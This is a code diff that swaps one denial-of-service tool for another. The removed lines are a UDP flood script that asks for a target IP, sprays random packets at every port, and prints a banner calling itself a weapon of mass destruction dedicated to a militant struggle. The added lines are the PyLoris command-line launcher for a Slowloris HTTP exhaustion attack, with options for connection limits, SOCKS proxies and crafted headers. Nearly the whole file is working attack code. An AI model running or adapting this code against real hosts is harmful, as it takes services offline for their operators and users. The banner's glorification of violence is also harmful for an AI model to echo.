@@ -1,79 +1,128 @@
 # -*- coding: utf-8 -*-
-import os
-import socket
-import random
+import optparse
+import sys
 import time
 
+from libloris import *
 
-# Colors
-class bcolors:
-    HE = '\033[95m'
-    OK = '\033[94m'
-    CY = '\033[96m'
-    GR = '\033[92m'
-    WARNING = '\033[93m'
-    UNDERLINE = '\033[4m'
-    PUR = '\033[97m'
-    BO    = "\033[1m"
-    BL   = "\033[30m"
-    RE     = "\033[31m"
-    GR   = "\033[32m"
-    YE  = "\033[33m"
-    BL    = "\033[34m"
-    MAG = "\033[35m"
-    CY   = "\033[36m"
-    WH   = "\033[37m"
-    os.system("clear")
+def parse_options():
+    parser = optparse.OptionParser(usage = "%prog [options] www.host.com")
+    parser.add_option("-a", "--attacklimit", action = "store", type = "int", dest = "attacklimit", default = 500, help = "Total number of connections to make (0 = unlimited, default = 500)")
+    parser.add_option("-c", "--connectionlimit", action = "store", type = "int", dest = "connectionlimit", default = 500, help = "Total number of concurrent connections to allow (0 = unlimited, default = 500)")
+    parser.add_option("-t", "--threadlimit", action = "store", type = "int", dest = "threadlimit", default = 50, help = "Total number of concurrent threads (0 = unlimited, default = 50)")
+    parser.add_option("-b", "--connectionspeed", action = "store", type = "float", dest = "connectionspeed", default = 1, help = "Individual connection bandwidth in bytes per second (default = 1)")
 
-########################
-white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(3500)
-####################
+    parser.add_option("-f", "--finish", action = "store_true", dest = "finish", default = False, help = "Complete each session rather than leave them unfinished (lessens the effectiveness, increases bandwidth usage)")
+    parser.add_option("-k", "--keepalive", action = "store_true", dest = "keepalive", default = False, help = "Turn Keep-Alive on")
 
-os.system("clear")
-print("""
-\033[33m                                                   ╔═ ╗           
-\033[33m                                                   ║\033[32m█\033[33m ║  
-\033[33m                                                   ║\033[32m█\033[33m ║  
-\033[33m                                                   ║\033[32m█\033[33m ║        
-\033[33m                   ╔═ ╗     ╔═ ╗      ╔═ ╗     ╔═ ╗║\033[32m█\033[33m ║     
-\033[33m                   ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║      ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║║\033[32m█\033[33m ║    
-\033[33m     ╔═ ╗          ║\033[32m█████████ █████████ █████████\033[33m ║║\033[32m█\033[33m ║
-\033[33m     ║\033[32m█\033[33m ║          ║\033[32m████████\033[33m ║\033[32m ███████\033[33m ║\033[32m ███████\033[33m ║ ║\033[32m█\033[33m ║
-\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ╔═════╝  ╚══════╝╚╔═ ╗╔═ ╗╝  ║\033[32m█\033[33m ║
-\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ║                 ║\033[32m█\033[33m ║║\033[32m█\033[33m ║   ╚═ ╝
-\033[33m      ║\033[32m███████████\033[33m ║                    ╚═ ╝╚═ ╝   
-\033[33m       ║\033[32m██████████\033[33m ║                 
-\033[33m        ╚═════════╝                  
-\033[32m╔═══════════════════════════════════════════════════════════╗
-\033[32m║\033[33m  Y A S E E N   T H U N D E R   S C R I P T   D D 0 S      \033[32m║
-\033[32m╚═══════════════════════════════════════════════════════════╝
-""")
-ip = input("\033[33m[+] Target's IP : ")
-time.sleep(5),
-print("\033[32m     Yaseen thunder \033[0m "),
-time.sleep(5),
-print("\033[33m     a weapon of mass destructions \033[0m "),
-time.sleep(5),
-print("\033[32m     the most feared by the oppressors \033[0m "),
-time.sleep(5),
-print("\033[33m     a weapon dedicated to a fighter for the revival of Al-Aqsa \033[0m "),
-time.sleep(5),
-print("\033[32m     a father for all Palestinians \033[0m "),
-time.sleep(5),
-print("\033[33m     So.... This script is a small dedication to the struggle \033[0m "),
-time.sleep(5),
-print("\033[32m     in memory of the great warriors in the path of Allah \033[0m")
-time.sleep(5)
-print("\033[32m     ...\033[0m")
-time.sleep(5)
-while True:
-    sent = 0
-    for port in range(1, 65534):
-        white.sendto(bytes, (ip, port))
-        sent = sent + 1
-        time.sleep(1)
-        print("\033[94m[AYAS] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
-    if():
-        s.close
-        print("\033[92mSerangan wes Rampung\033[0m")
+    parser.add_option("-p", "--port", action = "store", type = "int", dest = "port", default = 80, help = "Port to initiate attack on (default = 80)")
+    parser.add_option("-P", "--page", action = "store", type = "string", dest="page", default = '/', help = "Page to request from the server (default = /)")
+    parser.add_option("-q", "--quit", action = "store_true", dest = "quit", default = False, help = "Quit without receiving data from the server (can shorten the duration of the attack)")
+    parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
+    parser.add_option("-R", "--referer", action = "store", type = "string", dest = "referer", default = '', help = "Set the Referer HTTP header.")
+    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 0, help = "Size of data segment to attach in cookie (default = 0)")
+    parser.add_option("-S", "--ssl", action = "store_true", dest = "ssl", default = False, help = "Use SSL/TLS connection (for HTTPS testing)")
+    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = 'pyloris.sf.net', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
+    parser.add_option("-z", "--gzip", action = "store_true", dest = "gzip", default = False, help = "Request compressed data stream")
+
+    parser.add_option("-w", "--timebetweenthreads", action = "store", type = "float", dest = "timebetweenthreads", default = 0, help = "Time to wait between spawning threads in seconds (default = 0)")
+    parser.add_option("-W", "--timebetweenconnections", action = "store", type = "float", dest = "timebetweenconnections", default = 1, help = "Time to wait in between starting connections (default = 1)")
+
+    parser.add_option("", "--socksversion", action = "store", type = "string", dest = "socksversion", default = '', help = "SOCKS version, SOCKS4, SOCKS5, or HTTP. Reqires --sockshost and --socksport")
+    parser.add_option("", "--sockshost", action = "store", type = "string", dest = "sockshost", default = '127.0.0.1', help = "SOCKS host address (default = 127.0.0.1)")
+    parser.add_option("", "--socksport", action = "store", type = "int", dest = "socksport", default = 0, help = "SOCKS port number")
+    parser.add_option("", "--socksuser", action = "store", type = "string", dest = "socksuser", default = '', help = "SOCKS username")
+    parser.add_option("", "--sockspass", action = "store", type = "string", dest = "sockspass", default = '', help = "SOCKS password")
+
+    parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level")
+
+    (options, args) = parser.parse_args()
+
+    sys.stdout.write("PyLoris, a Python implementation of the Slowloris attack (http://ha.ckers.org/slowloris).\r\n")
+
+    if len(args) != 1:
+        sys.stderr.write("No host supplied or incorrect number of arguments used.\nUse -h or --help for more information\n")
+        print args
+        sys.exit(1)
+    
+    OptionSet = DefaultOptions()
+
+    OptionSet['host'] = args[0]
+    OptionSet['port'] = options.port
+    OptionSet['ssl'] = options.ssl
+    OptionSet['attacklimit'] = options.attacklimit
+    OptionSet['connectionlimit'] = options.connectionlimit
+    OptionSet['threadlimt'] = options.threadlimit
+    OptionSet['timebetweenthreads'] = options.timebetweenthreads
+    OptionSet['timebetweenconnections'] = options.timebetweenconnections
+    OptionSet['connecitonspeed'] = options.connectionspeed
+    OptionSet['socksversion'] = options.socksversion
+    OptionSet['sockshost'] = options.sockshost
+    OptionSet['socksport'] = options.socksport
+    OptionSet['socksuser'] = options.socksuser
+    OptionSet['sockspass'] = options.sockspass
+    OptionSet['quitimmediately'] = options.quit
+
+    requesttype = options.requesttype.upper()
+    if requesttype not in ('GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'):
+        sys.stderr.write('Invalid request type.\nUse -h or --help for more information')
+        sys.exit(3)
+
+    request = '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s' % (requesttype, options.page, args[0], options.useragent)
+
+    if options.keepalive == True:
+        request += '\r\nKeep-Alive: 300\r\nConnection: Keep-Alive'
+
+    if options.gzip == True:
+        request += '\r\nAccept-Encoding: gzip'
+
+    if options.referer != '':
+        request += '\r\nReferer: %s' % (options.referer)
+
+    if options.size > 0:
+        request += '\r\nCookie: '
+        if options.size > 100:
+            count = options.size / 100
+            for i in range(int(count)):
+                request += ('data%i=%s ' % (i, 'A' * 100))
+            request += 'data=' + ('A' * 100)
+        else:
+            request += 'data=' + ('A' * options.size)
+
+    if options.finish == True:
+        print("Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.")
+        request += '\r\n\r\n'
+
+    OptionSet['request'] = request
+
+    return OptionSet
+
+if __name__ == "__main__":
+    options = parse_options()
+    loris = Loris()
+    loris.LoadOptions(options)
+    loris.start()
+    time.sleep(1)
+
+    while loris.running:
+        status = loris.status()
+
+        try:
+            while True:
+                message = loris.messages.get()
+                print(message)
+        except:
+            pass
+
+        try:
+            while True:
+                error = loris.errors.get()
+                print(error)
+        except:
+            pass
+
+        print('Pyloris has started %i attacks, with %i threads and %i connections currently running.' % status)
+    status = loris.status()
+    print('Pyloris has completed %i attacks.' % (status[0]))
+
+
